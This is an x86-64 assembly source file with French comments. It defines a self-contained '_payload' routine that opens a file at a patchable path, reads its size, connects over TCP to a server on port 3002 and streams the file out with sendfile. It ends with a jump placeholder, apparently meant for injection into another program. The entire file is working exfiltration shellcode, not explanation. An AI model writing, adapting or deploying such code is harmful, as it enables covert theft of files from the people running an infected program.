[BITS 64]

section .text
global _payload
global _payload_size

_payload:
    push rbp
    mov rbp, rsp

    ; Ouvrir le fichier
    mov rax, 2			; SYS_open
    lea rdi, [rel path]		; Chemin du fichier
    mov rsi, 0			; O_RDONLY
    syscall
    test rax, rax
    js exit				; Gestion de l'erreur

    mov r12, rax ; Descripteur de fichier

    ; Récupérer les métadonnées du fichier
    mov rax, 4				; SYS_stat
    lea rdi, [rel path]			; Chemin du fichier
    lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
    syscall
    test rax, rax
    js error_open			; Gestion de l'erreur

    ; Créer la socket
    mov rax, 41				; SYS_socket
    mov rdi, 2				; AF_INET
    mov rsi, 1				; SOCK_STREAM
    mov rdx, 0
    syscall
    test rax, rax
    js error_open			; Gestion de l'erreur

	; Sauvegarder le descripteur de socket
    mov r13, rax ; Descripteur de socket

    ; Connecter au serveur
    mov rax, 42				; SYS_connect
    mov rdi, r13			; Descripteur de socket
    lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
    mov rdx, 16				; Taille de sockaddr_in
    syscall
    test rax, rax
    js error_socket			; Gestion de l'erreur

	; Send the file
	mov rax, 40						; SYS_sendfile
	mov rdi, r13					; socket file descriptor
	mov rsi, r12					; file descriptor
	xor rdx, rdx					; offset (NULL)
	mov r10, [rel stat_buffer + 48]	; size
	syscall
    test rax, rax
    js error_socket					; Gestion de l'erreur

error_socket:
    ; Gestion de l'erreur
	; Fermer la socket
    mov rax, 3 ; SYS_close
    mov rdi, r13
    syscall
    jmp exit

error_open:
    ; Gestion de l'erreur
	; Fermer le fichier
    mov rax, 3 ; SYS_close
    mov rdi, r12
	syscall
    jmp exit

exit:
    ; Jump to the next instruction
	jmp 0x0

stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
path		times 1024 db 0	; Chemin du fichier
sockaddr_in:
	; - sin_family: 2 octets
	; - sin_port: 2 octets
	; - sin_addr: 4 octets
	; - sin_zero: 8 octets
	dw 2                       ; sin_family (AF_INET)
	dw 0xba0b                  ; sin_port (3002 en hex)
	dd 0                       ; sin_addr (INADDR_ANY)
	times 8 db 0               ; sin_zero (8 octets de zéros)
	; Taille totale: 16 octets
_payload_size dq $- _payload